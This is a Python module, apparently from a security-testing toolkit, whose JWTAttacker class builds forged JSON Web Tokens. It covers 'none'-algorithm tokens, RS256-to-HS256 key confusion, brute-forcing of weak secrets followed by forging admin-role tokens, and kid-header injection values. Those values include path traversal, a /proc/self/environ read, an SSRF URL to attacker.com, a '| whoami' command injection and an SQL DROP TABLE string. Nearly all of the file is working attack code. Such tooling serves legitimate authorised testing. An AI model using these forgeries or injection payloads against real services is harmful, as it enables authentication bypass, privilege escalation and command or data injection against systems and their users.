#!/usr/bin/env python3
"""
JWT Attack Module
Tests for JWT vulnerabilities: algorithm confusion, weak secrets, etc.
"""

import json
import base64
import hashlib
import hmac
from typing import Dict, List, Tuple, Optional


class JWTAttacker:
    """JWT vulnerability testing"""

    # Common weak secrets for brute force
    WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "test",
        "key",
        "jwt",
        "token",
        "secret123",
        "password123",
        "qwerty",
        "12345678",
        "abc123",
        "letmein",
        "monkey",
        "dragon",
    ]

    @staticmethod
    def decode_jwt(token: str) -> Optional[Dict]:
        """
        Decode JWT without verification

        Args:
            token: JWT token string

        Returns:
            Dict with header, payload, signature or None if invalid
        """
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            # Decode header and payload
            header = json.loads(JWTAttacker._base64_decode(parts[0]))
            payload = json.loads(JWTAttacker._base64_decode(parts[1]))
            signature = parts[2]

            return {
                "header": header,
                "payload": payload,
                "signature": signature,
                "raw": token,
            }
        except:
            return None

    @staticmethod
    def _base64_decode(data: str) -> str:
        """Decode base64url"""
        # Add padding if needed
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += "=" * padding

        # Replace URL-safe chars
        data = data.replace("-", "+").replace("_", "/")

        return base64.b64decode(data).decode("utf-8")

    @staticmethod
    def _base64_encode(data: str) -> str:
        """Encode to base64url"""
        encoded = base64.b64encode(data.encode("utf-8")).decode("utf-8")
        # Remove padding and make URL-safe
        return encoded.rstrip("=").replace("+", "-").replace("/", "_")

    @staticmethod
    def none_algorithm_attack(token: str) -> List[str]:
        """
        Generate JWT with 'none' algorithm (CVE-2015-9235)

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Attack 1: alg=none
        header = decoded["header"].copy()
        header["alg"] = "none"

        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

        # With empty signature
        payloads.append(f"{header_b64}.{payload_b64}.")

        # Without signature
        payloads.append(f"{header_b64}.{payload_b64}")

        # Attack 2: alg=None (capital N)
        header["alg"] = "None"
        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payloads.append(f"{header_b64}.{payload_b64}.")

        # Attack 3: alg=NONE (all caps)
        header["alg"] = "NONE"
        header_b64 = JWTAttacker._base64_encode(json.dumps(header))
        payloads.append(f"{header_b64}.{payload_b64}.")

        return payloads

    @staticmethod
    def algorithm_confusion_attack(token: str) -> List[str]:
        """
        RS256 to HS256 confusion attack
        Server uses RS256 (asymmetric) but accepts HS256 (symmetric)

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Change algorithm to HS256
        header = decoded["header"].copy()
        original_alg = header.get("alg", "")

        if original_alg.startswith("RS") or original_alg.startswith("ES"):
            header["alg"] = "HS256"

            header_b64 = JWTAttacker._base64_encode(json.dumps(header))
            payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

            # Sign with common public key strings
            common_keys = [
                "-----BEGIN PUBLIC KEY-----",
                "public.pem",
                "publickey",
            ]

            for key in common_keys:
                signature = hmac.new(
                    key.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
                ).digest()

                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")
                payloads.append(f"{header_b64}.{payload_b64}.{sig_b64}")

        return payloads

    @staticmethod
    def weak_secret_attack(token: str) -> List[Tuple[str, str]]:
        """
        Brute force JWT with weak secrets

        Args:
            token: Original JWT token

        Returns:
            List of (secret, forged_token) tuples
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        results = []

        header_b64 = token.split(".")[0]
        payload_b64 = token.split(".")[1]
        original_sig = token.split(".")[2]

        # Try to crack the secret
        for secret in JWTAttacker.WEAK_SECRETS:
            # Calculate signature with this secret
            signature = hmac.new(
                secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
            ).digest()

            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

            # Check if it matches
            if sig_b64 == original_sig:
                # Found the secret! Now forge token
                payload = decoded["payload"].copy()

                # Modify payload (e.g., escalate privileges)
                if "role" in payload:
                    payload["role"] = "admin"
                if "admin" in payload:
                    payload["admin"] = True
                if "user" in payload:
                    payload["user"] = "admin"

                # Create forged token
                new_payload_b64 = JWTAttacker._base64_encode(json.dumps(payload))
                new_signature = hmac.new(
                    secret.encode(),
                    f"{header_b64}.{new_payload_b64}".encode(),
                    hashlib.sha256,
                ).digest()
                new_sig_b64 = (
                    base64.urlsafe_b64encode(new_signature).decode().rstrip("=")
                )

                forged_token = f"{header_b64}.{new_payload_b64}.{new_sig_b64}"
                results.append((secret, forged_token))

        return results

    @staticmethod
    def kid_injection_attack(token: str) -> List[str]:
        """
        Key ID (kid) injection attack

        Args:
            token: Original JWT token

        Returns:
            List of attack payloads
        """
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []

        # Inject malicious kid values
        malicious_kids = [
            "/dev/null",  # Empty key
            "../../public.pem",  # Path traversal
            "/proc/self/environ",  # Linux env vars
            "http://attacker.com/key",  # SSRF
            "| whoami",  # Command injection
            "'; DROP TABLE users--",  # SQL injection
        ]

        for kid in malicious_kids:
            header = decoded["header"].copy()
            header["kid"] = kid

            header_b64 = JWTAttacker._base64_encode(json.dumps(header))
            payload_b64 = JWTAttacker._base64_encode(json.dumps(decoded["payload"]))

            # Sign with empty key (for /dev/null)
            signature = hmac.new(
                b"", f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

            payloads.append(f"{header_b64}.{payload_b64}.{sig_b64}")

        return payloads

    @staticmethod
    def generate_test_payloads(token: str) -> Dict[str, List]:
        """
        Generate all JWT attack payloads

        Args:
            token: Original JWT token

        Returns:
            Dict with attack type -> payloads
        """
        return {
            "none_algorithm": JWTAttacker.none_algorithm_attack(token),
            "algorithm_confusion": JWTAttacker.algorithm_confusion_attack(token),
            "weak_secret": JWTAttacker.weak_secret_attack(token),
            "kid_injection": JWTAttacker.kid_injection_attack(token),
        }


# Test
if __name__ == "__main__":
    print("JWT Attack Module Test\n")

    # Create a test JWT with weak secret
    test_header = {"alg": "HS256", "typ": "JWT"}
    test_payload = {"user": "john", "role": "user", "admin": False}

    header_b64 = (
        base64.urlsafe_b64encode(json.dumps(test_header).encode()).decode().rstrip("=")
    )

    payload_b64 = (
        base64.urlsafe_b64encode(json.dumps(test_payload).encode()).decode().rstrip("=")
    )

    # Sign with weak secret
    secret = "secret"
    signature = hmac.new(
        secret.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256
    ).digest()
    sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip("=")

    test_token = f"{header_b64}.{payload_b64}.{sig_b64}"

    print(f"Test JWT: {test_token}\n")

    # Decode
    decoded = JWTAttacker.decode_jwt(test_token)
    print(f"Decoded header: {decoded['header']}")
    print(f"Decoded payload: {decoded['payload']}\n")

    # Test attacks
    print("=== None Algorithm Attack ===")
    none_payloads = JWTAttacker.none_algorithm_attack(test_token)
    for i, payload in enumerate(none_payloads, 1):
        print(f"{i}. {payload[:80]}...")

    print("\n=== Weak Secret Attack ===")
    weak_results = JWTAttacker.weak_secret_attack(test_token)
    for secret, forged in weak_results:
        print(f"Found secret: '{secret}'")
        print(f"Forged token: {forged[:80]}...")
        decoded_forged = JWTAttacker.decode_jwt(forged)
        print(f"Forged payload: {decoded_forged['payload']}")

    print("\n=== KID Injection Attack ===")
    kid_payloads = JWTAttacker.kid_injection_attack(test_token)
    print(f"Generated {len(kid_payloads)} kid injection payloads")
